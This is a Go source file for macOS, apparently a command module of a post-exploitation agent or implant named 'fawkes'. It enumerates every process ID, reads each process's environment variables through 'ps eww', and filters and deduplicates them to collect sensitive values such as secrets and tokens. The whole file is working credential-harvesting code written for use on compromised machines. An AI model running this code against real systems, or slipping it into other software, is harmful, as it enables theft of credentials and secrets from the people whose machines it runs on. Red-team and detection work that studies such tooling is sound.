//go:build darwin
// +build darwin

package commands

import (
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"fawkes/pkg/structs"
)

// readProcessEnviron reads environment variables from a process on macOS.
// Uses ps eww to get command line with environment.
func readProcessEnviron(pid int) ([]string, string, error) {
	// Get process name
	processName := fmt.Sprintf("pid-%d", pid)
	if out, err := exec.Command("ps", "-p", strconv.Itoa(pid), "-o", "comm=").Output(); err == nil {
		processName = strings.TrimSpace(string(out))
		// Get just the basename
		if idx := strings.LastIndex(processName, "/"); idx >= 0 {
			processName = processName[idx+1:]
		}
	}

	// Read environment via ps eww
	out, err := exec.Command("ps", "eww", "-p", strconv.Itoa(pid), "-o", "command=").Output()
	if err != nil {
		return nil, processName, fmt.Errorf("cannot read process environment: %v", err)
	}

	// ps eww output includes command followed by env vars separated by spaces
	// Each env var is KEY=VALUE
	line := strings.TrimSpace(string(out))
	if line == "" {
		return nil, processName, fmt.Errorf("no output from ps")
	}

	// Parse: the command comes first, then env vars. We need to identify where
	// the command ends and env vars begin. Env vars contain '=' while command args
	// typically don't (though some may). We extract everything that looks like KEY=VALUE.
	var envVars []string
	parts := strings.Fields(line)
	for _, part := range parts {
		if strings.Contains(part, "=") {
			// Basic validation: key shouldn't start with - (likely a flag)
			key := strings.SplitN(part, "=", 2)[0]
			if len(key) > 0 && key[0] != '-' {
				envVars = append(envVars, part)
			}
		}
	}

	return envVars, processName, nil
}

// envScanAllProcesses scans all accessible processes for sensitive env vars.
func envScanAllProcesses(filter string) structs.CommandResult {
	// Get all PIDs via ps
	out, err := exec.Command("ps", "-axo", "pid=").Output()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to list processes: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	var allResults []envScanResult
	totalProcesses := 0
	accessibleProcesses := 0
	myUID := os.Getuid()

	lines := strings.Split(strings.TrimSpace(string(out)), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		pid, err := strconv.Atoi(line)
		if err != nil || pid <= 0 {
			continue
		}
		totalProcesses++

		// On macOS, ps eww only shows env for same-user processes (unless root)
		// Skip known system PIDs to avoid noise
		if pid == 0 || pid == 1 {
			if myUID != 0 {
				continue
			}
		}

		envVars, processName, err := readProcessEnviron(pid)
		if err != nil {
			continue
		}
		accessibleProcesses++

		results := filterSensitiveVars(envVars, pid, processName)
		allResults = append(allResults, results...)
	}

	// Deduplicate
	allResults = deduplicateResults(allResults)

	if filter != "" {
		allResults = applyEnvFilter(allResults, filter)
	}

	output := formatEnvScanResults(allResults, totalProcesses, accessibleProcesses)
	return structs.CommandResult{
		Output:    output,
		Status:    "success",
		Completed: true,
	}
}

func deduplicateResults(results []envScanResult) []envScanResult {
	type key struct {
		variable string
		value    string
	}
	seen := make(map[key]bool)
	var deduped []envScanResult

	for _, r := range results {
		k := key{r.Variable, r.Value}
		if !seen[k] {
			seen[k] = true
			deduped = append(deduped, r)
		}
	}
	return deduped
}
